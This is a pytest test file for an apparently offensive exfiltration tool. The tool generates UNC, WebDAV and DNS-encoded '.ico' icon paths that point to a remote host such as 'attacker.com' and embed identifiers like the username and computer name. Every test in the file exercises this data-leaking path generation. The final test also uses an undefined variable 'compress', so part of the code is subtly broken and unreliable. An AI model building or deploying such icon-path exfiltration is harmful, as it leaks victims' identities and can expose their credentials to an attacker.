"""
Tests for exfiltration methods
"""

import pytest
import hashlib
from generate_new import Exfiltrator, ExfiltrationMethod


class TestExfiltrator:
    """Test exfiltration functionality"""

    def test_unc_path_generation(self, basic_exfil_method):
        """Test UNC path generation"""
        exfil = Exfiltrator(basic_exfil_method)
        data = "test_data"

        path = exfil.generate_unc_path(data)

        assert path.startswith("\\\\")
        assert basic_exfil_method.host in path
        assert path.endswith(".ico")
        assert "Share_" in path

    def test_unc_path_compression(self, basic_exfil_method):
        """Test UNC path with compression"""
        basic_exfil_method.compress = True
        exfil = Exfiltrator(basic_exfil_method)
        data = "some_long_data_string"

        path = exfil.generate_unc_path(data)

        # Should contain MD5 hash instead of full data
        data_hash = hashlib.md5(data.encode()).hexdigest()[:8]
        assert data_hash in path
        assert data not in path  # Original data should not be in path

    def test_unc_path_no_compression(self):
        """Test UNC path without compression"""
        exfil_method = ExfiltrationMethod(
            type="unc",
            host="192.168.1.100",
            compress=False
        )
        exfil = Exfiltrator(exfil_method)
        data = "USERNAME_COMPUTER"

        path = exfil.generate_unc_path(data)

        # Should contain sanitized data
        assert "USERNAME_COMPUTER" in path or "USERNAME" in path

    def test_http_url_generation(self, webdav_exfil_method):
        """Test HTTP URL generation"""
        exfil = Exfiltrator(webdav_exfil_method)
        data = "test_data"

        url = exfil.generate_http_url(data)

        assert url.startswith("https://")  # SSL enabled
        assert webdav_exfil_method.host in url
        assert str(webdav_exfil_method.port) in url
        assert "id=" in url  # Query parameter

    def test_webdav_path_generation(self, webdav_exfil_method):
        """Test WebDAV path generation"""
        exfil = Exfiltrator(webdav_exfil_method)
        data = "test_identifier"

        path = exfil.generate_webdav_path(data)

        assert path.startswith("\\\\")
        assert "@SSL@" in path  # SSL indicator
        assert ".ico" in path

    def test_dns_exfil_in_webdav_path(self):
        """Test DNS exfiltration encoded in WebDAV path"""
        exfil_method = ExfiltrationMethod(
            type="dns",
            host="attacker.com",
            ssl=True,
            port=443
        )
        exfil = Exfiltrator(exfil_method)
        data = "identifier"

        path = exfil.generate_webdav_path(data)

        # Should contain MD5 hash as subdomain
        data_hash = hashlib.md5(data.encode()).hexdigest()[:16]
        assert data_hash in path
        assert "attacker.com" in path

    def test_get_icon_path_unc(self, basic_exfil_method):
        """Test get_icon_path for UNC type"""
        exfil = Exfiltrator(basic_exfil_method)
        data = "test"

        path = exfil.get_icon_path(data)

        assert path.startswith("\\\\")
        assert path.endswith(".ico")

    def test_get_icon_path_webdav(self, webdav_exfil_method):
        """Test get_icon_path for HTTP/WebDAV type"""
        exfil = Exfiltrator(webdav_exfil_method)
        data = "test"

        path = exfil.get_icon_path(data)

        assert path.startswith("\\\\")
        assert "@SSL@" in path

    def test_unsupported_exfil_type(self):
        """Test that unsupported type raises error"""
        exfil_method = ExfiltrationMethod(
            type="invalid_type",  # type: ignore
            host="test.com"
        )
        exfil = Exfiltrator(exfil_method)

        with pytest.raises(ValueError, match="Unsupported exfiltration type"):
            exfil.get_icon_path("data")

    def test_special_characters_in_unc_path(self):
        """Test special character handling in UNC paths"""
        exfil_method = ExfiltrationMethod(
            type="unc",
            host="192.168.1.100",
            compress=False
        )
        exfil = Exfiltrator(exfil_method)

        # Test with special characters
        data = "%USERNAME%$TEST SPACE"
        path = exfil.generate_unc_path(data)

        # Should be sanitized
        assert "%" not in path or compress  # Either removed or in hash
        assert "$" not in path or compress
        # Spaces should be replaced with underscores
        if not exfil_method.compress:
            assert "_" in path
